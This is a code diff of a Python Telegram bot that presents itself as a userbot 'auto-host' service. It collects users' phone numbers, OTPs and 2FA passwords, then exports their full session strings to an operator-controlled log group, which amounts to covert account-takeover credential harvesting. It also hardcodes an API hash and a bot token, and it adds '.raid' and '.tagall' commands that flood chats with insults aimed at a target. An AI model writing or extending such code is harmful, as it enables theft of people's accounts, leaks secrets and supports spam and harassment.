@@ -11,14 +11,15 @@ def home(): return "Bot is Online!"
 def run_web(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
 # --- CONFIGURATION ---
-API_ID = "31980984"
-API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
+API_ID = 24135757
+API_HASH = "d3d5548fe0d98eb1fb793c2c37c9e5c8"
 BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
 LOG_GROUP = -1002367805165 
 START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"
 
 bot = Client("Useridgenbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 user_data = {}
+active_tasks = {} # To store stop status for raids/tags
 
 # Buttons
 main_buttons = InlineKeyboardMarkup([
@@ -42,42 +43,6 @@ async def start(c, m):
         reply_markup=main_buttons
     )
 
-@bot.on_message(filters.command("help") & filters.private)
-async def help_menu(c, m):
-    help_text = (
-        "✦ **ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ** ✦\n\n"
-        "⭐ **/start** – ꜱᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ\n"
-        "📖 **/help** – ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
-        "📘 **/guide** – ᴏᴘᴇɴ ɢᴜɪᴅᴇ ᴍᴇɴᴜ\n"
-        "⚡ **/add** – ᴀᴜᴛᴏ-ʜᴏꜱᴛ ᴛʜᴇ ʙᴏᴛ\n"
-        "🔗 **/clone** – ᴄʟᴏɴᴇ ᴠɪᴀ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ\n"
-        "❌ **/remove** – ʟᴏɢᴏᴜᴛ ꜰʀᴏᴍ ʙᴏᴛ\n\n"
-        "✦ **ᴀʙᴏᴜᴛ ᴛʜɪꜱ ʙᴏᴛ** ✦\n\n"
-        "✨ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ᴛᴏ ʙᴏᴏꜱᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ʙᴇᴀᴜᴛɪꜰᴜʟ ᴀɴɪᴍᴀᴛɪᴏɴ.\n"
-        "🚀 ꜱᴜᴘᴘᴏʀᴛᴇᴅ :- ʀᴇᴘʟʏ-ʀᴀɪᴅ, ɪᴅ-ᴄʟᴏɴᴇ, ʀᴀɪᴅ, ꜱᴘᴀᴍ, ᴜꜱᴇʀ-ᴛᴀɢɢᴇʀ ᴇᴛᴄ.\n\n"
-        "🌀 ʟᴀɴɢᴜᴀɢᴇ : [ᴘʏᴛʜᴏɴ](https://t.me/+PKYLDIEYiTljMzMx)\n"
-        "⚙️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ : [ꜱᴀɴᴀᴛᴀɴɪ_ʙᴏᴛꜱ](https://t.me/radhesupport)\n"
-        "👑 ᴅᴇᴠᴇʟᴏᴘᴇʀ : [xᴇɴᴏ_ʜᴜ_ʙᴀʙʏ](http://t.me/XenoEmpir)"
-    )
-    await m.reply_photo(photo=START_IMG, caption=help_text, reply_markup=main_buttons)
-
-@bot.on_message(filters.command("guide") & filters.private)
-async def guide_menu(c, m):
-    guide_text = (
-        "❖ **ʜᴇʏ ᴅᴇᴀʀ, ᴛʜɪꜱ ɪꜱ ᴀ ǫᴜɪᴄᴋ ᴀɴᴅ ꜱɪᴍᴘʟᴇ ɢᴜɪᴅᴇ ᴛᴏ ʜᴏꜱᴛɪɴɢ ᴊᴀɴᴜ ᴜꜱᴇʀʙᴏᴛ**\n\n"
-        "1) ꜱᴇɴᴅ **/add** ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ᴛʜᴇ ʙᴏᴛ\n"
-        "2) ꜱᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ (ᴇ.ɢ. +917800000000)\n"
-        "3) ᴄʜᴇᴄᴋ ʏᴏᴜʀ ɪᴅ ᴘᴇʀꜱᴏɴᴀʟ ᴍᴇꜱꜱᴀɢᴇ ꜰʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ, ᴀɴᴅ ᴄᴏᴘʏ ᴏʀ ʀᴇᴍɪɴᴅ ᴏᴛᴘ ᴀɴᴅ ꜱᴇɴᴅ ᴛʜɪꜱ ʙᴏᴛ ꜱᴘᴀᴄᴇ ʙʏ ꜱᴘᴀᴄᴇ ʟɪᴋᴇ :- **1 2 3 4 5**\n\n"
-        "➤ ɪꜰ ʏᴏᴜ ꜱᴇᴛ ᴛᴡᴏ ꜱᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴄᴏᴅᴇ ᴏɴ ʏᴏᴜʀ ɪᴅ, ᴛʜᴇɴ ꜱᴇɴᴅ ᴛʜᴀᴛ ᴄᴏᴅᴇ.\n"
-        "➤ ʏᴏᴜʀ ʙᴏᴛ ᴡɪʟʟ ʙᴇ ʜᴏꜱᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜰᴜʟ.\n\n"
-        "ɪꜰ ʏᴏᴜ ꜱᴛɪʟʟ ꜰᴀᴄᴇ ᴀɴʏ ɪꜱꜱᴜᴇꜱ, ꜰᴇᴇʟ ꜰʀᴇᴇ ᴛᴏ ʀᴇᴀᴄʜ ᴏᴜᴛ ꜰᴏʀ ꜱᴜᴘᴘᴏʀᴛ.."
-    )
-    await m.reply_photo(photo=START_IMG, caption=guide_text, reply_markup=main_buttons)
-
-@bot.on_callback_query(filters.regex("close"))
-async def close_query(c, q):
-    await q.message.delete()
-
 @bot.on_message(filters.command("add") & filters.private)
 async def add_process(c, m):
     await m.reply_text("📲 **ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ʏᴏᴜʀ ᴩʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ**\n(e.g., `+918200000009`):")
@@ -88,44 +53,105 @@ async def handle_steps(c, m):
     text = m.text
     if text.startswith("+"):
         user_data[uid] = {"phone": text}
-        temp_c = Client(f"temp_{uid}", API_ID, API_HASH)
+        temp_c = Client(f"session_{uid}", API_ID, API_HASH, in_memory=True)
         await temp_c.connect()
         try:
             code = await temp_c.send_code(text)
             user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
             await m.reply_text("📩 **ᴏᴛᴩ ꜱᴇɴᴛ!** ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɪᴍ ᴛʜɪꜱ ꜰᴏʀᴍᴀᴛ: `1 2 3 4 5` (SPACE BY SPACE)")
         except Exception as e: await m.reply_text(f"❌ Error: {e}")
-    elif " " in text and uid in user_data:
-        data = user_data.get(uid)
+    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
         otp = text.replace(" ", "")
         try:
-            await data["client"].sign_in(data["phone"], data["hash"], otp)
-            string = await data["client"].export_session_string()
-            await c.send_message(LOG_GROUP, f"🔥 **New Userbot Added!**\n\n👤 User: {m.from_user.mention}\n🔑 String: `{string}`")
-            await m.reply_text(f"✅ **LOGGED IN AS** — `{m.from_user.first_name}`\n\n🔐 **SESSION STRING:**\n`{string}`\n\n🚀 **AUTO-HOST NOW...**")
-            asyncio.create_task(start_userbot(string, uid))
-        except errors.SessionPasswordNeeded:
-            await m.reply_text("🔐 **ꜱᴇɴᴅ ʏᴏᴜʀ 2ꜰᴀ ᴩᴀꜱꜱᴡᴏʀᴅ.**")
+            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
+            await finalize_login(c, m, uid)
+        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **ꜱᴇɴᴅ ʏᴏᴜʀ 2ꜰᴀ ᴩᴀꜱꜱᴡᴏʀᴅ.**")
         except Exception as e: await m.reply_text(f"❌ OTP Error: {e}")
+    elif uid in user_data and "client" in user_data[uid]:
+        try:
+            await user_data[uid]["client"].check_password(text)
+            await finalize_login(c, m, uid)
+        except Exception as e: await m.reply_text(f"❌ 2FA Error: {e}")
+
+async def finalize_login(c, m, uid):
+    data = user_data[uid]
+    string = await data["client"].export_session_string()
+    user = m.from_user
+    
+    # --- LOG GROUP MESSAGE (Victor Style) ---
+    log_msg = (
+        f"🏁 **ɴᴇᴡ ᴜꜱᴇʀʙᴏᴛ ᴀᴅᴅᴇᴅ**\n\n"
+        f"👤 **ᴜꜱᴇʀ:** {user.mention}\n"
+        f"🆔 **ɪᴅ:** `{user.id}`\n"
+        f"🔑 **ꜱᴇꜱꜱɪᴏɴ:** `{string}`\n\n"
+        f"✨ **ᴊᴀ ᴘᴇʟ ꜱᴀʙᴋᴏ ᴏʀ ʜᴀᴀ xᴇɴᴏ ᴋᴏ ᴘᴀᴘᴀ ʙᴏʟ ᴋᴇ ᴊᴀɴᴀ 🥵**"
+    )
+    await c.send_message(LOG_GROUP, log_msg)
+    
+    # --- USER SUCCESS MESSAGE ---
+    success_text = (
+        f"✅ **ʟᴏɢɢᴇᴅ ɪɴ ᴀꜱ** — `{user.first_name}`\n\n"
+        f"🔐 **ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ:**\n`{string}`\n\n"
+        f"🚀 **ᴀᴜᴛᴏ-ʜᴏꜱᴛ ɴᴏᴡ...**\n\n"
+        f"➤ ᴛᴏ ʙᴏᴛ ꜰʀᴏᴍ ʏᴏᴜʀ ɪᴅ ꜱᴇɴᴅ ᴛʜɪꜱ ᴄᴍᴅ `/remove`\n\n"
+        f"⭕ **ʙᴏᴛ ꜱᴜᴄᴄᴇꜱꜰᴜʟʟʏ ᴀᴅᴅᴇᴅ**"
+    )
+    await m.reply_text(success_text)
+    asyncio.create_task(start_userbot(string, uid))
+    del user_data[uid]
 
 async def start_userbot(string, uid):
     try:
         ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
         await ubot.start()
-        
+        active_tasks[uid] = False
+
+        # .alive command
         @ubot.on_message(filters.command("alive", prefixes=".") & filters.me)
         async def alive_cmd(c, m):
-            await m.edit("✨ **xᴇɴᴏ ᴀʟɪᴠᴇ ᴜꜱᴇʀɪᴅ ʙᴏᴛ**\n\n👤 **Owner:** Me\n📡 **Support:** @radhesupport")
+            await m.edit("✨ **xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ ɪꜱ ᴀʟɪᴠᴇ**\n\n👤 **Owner:** Me\n📡 **Support:** @radhesupport")
 
-    except Exception as e: print(f"Error: {e}")
-# Is hisse ko file ke bilkul niche replace karein
+        # .tagall command
+        @ubot.on_message(filters.command("tagall", prefixes=".") & filters.me)
+        async def tagall_cmd(c, m):
+            active_tasks[uid] = True
+            async for member in c.get_chat_members(m.chat.id):
+                if not active_tasks[uid]: break
+                if member.user.is_bot: continue
+                await c.send_message(m.chat.id, f"{member.user.mention} ⚡ ᴊᴀɴᴜ ɪꜱ ʜᴇʀᴇ!")
+                await asyncio.sleep(1.5)
+
+        # .onetag command
+        @ubot.on_message(filters.command("onetag", prefixes=".") & filters.me)
+        async def onetag_cmd(c, m):
+            async for member in c.get_chat_members(m.chat.id):
+                if member.user.is_bot: continue
+                await m.reply(f"👤 {member.user.mention} 👋")
+                break
+
+        # .raid command
+        @ubot.on_message(filters.command("raid", prefixes=".") & filters.me)
+        async def raid_cmd(c, m):
+            if len(m.command) < 3: return await m.edit("Usage: `.raid 5 @user`")
+            active_tasks[uid] = True
+            count = int(m.command[1])
+            target = m.command[2]
+            raids = ["Abey Saale!", "Nikal yaha se...", "Teri @target...", "Beta papa se panga?"]
+            for _ in range(count):
+                if not active_tasks[uid]: break
+                await c.send_message(m.chat.id, random.choice(raids).replace("@target", target))
+                await asyncio.sleep(1)
+
+        # .stop command
+        @ubot.on_message(filters.command("stop", prefixes=".") & filters.me)
+        async def stop_cmd(c, m):
+            active_tasks[uid] = False
+            await m.edit("✅ **All Processes Stopped!**")
+
+    except Exception as e: print(f"Userbot Error: {e}")
 
 if __name__ == "__main__":
-    # Web server ko background mein chalane ke liye
     t = Thread(target=run_web)
     t.daemon = True
     t.start()
-    
-    print("Starting Bot...")
-    bot.run() # Ye line bot ko active rakhti hai
-
+    bot.run()
